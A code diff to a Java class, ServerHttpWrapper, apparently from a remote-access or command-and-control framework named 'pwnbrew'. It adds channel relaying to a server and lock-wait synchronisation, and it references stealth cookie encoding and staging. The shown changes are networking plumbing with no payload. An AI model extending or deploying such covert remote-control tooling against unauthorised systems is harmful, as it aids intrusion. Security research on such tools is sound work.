@@ -51,14 +51,17 @@ import java.util.Arrays;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import pwnbrew.ClientConfig;
+import pwnbrew.concurrent.LockListener;
 import pwnbrew.log.LoggableException;
 import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.ConnectionManager;
 import pwnbrew.manager.DataManager;
+import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.Message;
 import pwnbrew.network.PortRouter;
 import pwnbrew.network.RegisterMessage;
 import pwnbrew.network.ServerPortRouter;
+import pwnbrew.network.relay.RelayManager;
 import pwnbrew.selector.SocketChannelHandler;
 import pwnbrew.utilities.SocketUtilities;
 import pwnbrew.utilities.Utilities;
@@ -67,7 +70,7 @@ import pwnbrew.utilities.Utilities;
  *
  *  
  */
-public class ServerHttpWrapper extends HttpWrapper {
+public class ServerHttpWrapper extends HttpWrapper implements LockListener {
 
     private static final String NAME_Class = ServerHttpWrapper.class.getSimpleName();
     private static final int STEALTH_COOKIE_B64 = 5;   
@@ -76,6 +79,7 @@ public class ServerHttpWrapper extends HttpWrapper {
     private final SecureRandom aSR = new SecureRandom();  
     private volatile boolean staging = false;
        
+    private int lockVal = 0;
     //==========================================================================
     /**
      * Constructor
@@ -155,14 +159,43 @@ public class ServerHttpWrapper extends HttpWrapper {
                                                         aMsg.setDestHostId(-1);
                                                          
                                                         //Try the default port router
-                                                        ClientConfig aConf = ClientConfig.getConfig();
-                                                        int thePort = aConf.getSocketPort();
-                                                        PortRouter thePR = aSPR.getPortManager().getPortRouter( thePort );
+                                                        ClientConfig theConf = ClientConfig.getConfig();
+                                                        int theSocketPort = theConf.getSocketPort();
+                                                        String serverIp = theConf.getServerIp();
+                                                        PortRouter thePR = aSPR.getPortManager().getPortRouter( theSocketPort );
                                                         
                                                         //Get the connection manager for the server
                                                         ConnectionManager aCM = thePR.getConnectionManager(-1);
                                                         if( aCM != null ){
-                                                            SocketChannelHandler srvHandler = aCM.getSocketChannelHandler(ConnectionManager.COMM_CHANNEL_ID);
+                                                            
+                                                            //Create a new channel if not comms
+                                                            int srcChannelId = aMsg.getChannelId();
+                                                            if( srcChannelId != ConnectionManager.COMM_CHANNEL_ID ){
+                                                                
+                                                                //Send back the ack
+                                                                RegisterMessage retMsg = new RegisterMessage(RegisterMessage.REG_ACK, chanId);
+                                                                retMsg.setDestHostId(srcHostId);
+                                                                
+                                                                //Try to send back
+                                                                DataManager.send(aSPR.getPortManager(), retMsg);
+                                                                passedHandler.setWrapping( false);
+                                                                
+                                                                if( thePR instanceof ClientPortRouter ){
+                                                                    
+                                                                    //TODO need to check if the id is already taken
+                                                                    ClientPortRouter aCPR = (ClientPortRouter)thePR;
+                                                                    srcChannelId = aCPR.ensureConnectivity(serverIp, theSocketPort, this, chanId);
+                                                                    
+                                                                    //Set route in relaymanager
+//                                                                    RelayManager theRelayManager = RelayManager.getRelayManager();
+//                                                                    theRelayManager.addRelayRoute( srcChannelId, retChannelId );
+                                                                    
+                                                                    //Set the new channel
+//                                                                    aMsg.setChannelId(retChannelId);
+                                                                }
+                                                            } 
+                                                            
+                                                            SocketChannelHandler srvHandler = aCM.getSocketChannelHandler( srcChannelId );
                                                             if( srvHandler != null ){
                                                                 byte[] regBytes = aMsg.getBytes();
                                                                 srvHandler.queueBytes(regBytes);
@@ -358,6 +391,40 @@ public class ServerHttpWrapper extends HttpWrapper {
         return staging;
     }
     
+    //===============================================================
+    /**
+     * 
+     * @param lockOp 
+     */
+    @Override
+    public synchronized void lockUpdate(int lockOp) {
+        lockVal = lockOp;
+        notifyAll();
+    }
+    
+    //===============================================================
+    /**
+     * 
+     * @return  
+     */
+    @Override
+    public synchronized int waitForLock() {
+        
+        int retVal;        
+        while( lockVal == 0 ){
+            try {
+                wait();
+            } catch (InterruptedException ex) {
+                continue;
+            }
+        }
+        
+        //Set to temp and reset
+        retVal = lockVal;
+        lockVal = 0;
+        
+        return retVal;
+    }
     
     
 }
